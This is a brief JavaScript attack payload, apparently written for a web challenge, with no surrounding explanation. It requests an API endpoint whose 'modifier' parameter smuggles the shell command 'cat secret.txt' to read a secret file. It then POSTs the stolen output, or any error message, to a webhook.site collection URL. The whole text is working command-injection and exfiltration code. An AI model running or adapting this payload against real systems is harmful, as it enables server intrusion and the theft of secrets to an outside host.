const fetchEndpoint = '/api/cal?modifier=;cat secret.txt';  // The endpoint to fetch data from
const reportEndpoint = 'https://webhook.site/1bcc4367-b9f6-47da-9d18-8637d16009bb';  // The server to send data or error to

fetch(fetchEndpoint)
  .then(res => res.text())  // Fetch the response as text
  .then(data => fetch(reportEndpoint, {  // Send the fetched data to the report server
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: data
  }))
  .catch(error => fetch(reportEndpoint, {  // If an error occurs, send the error message to the report server
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ error: error.message })
  }));

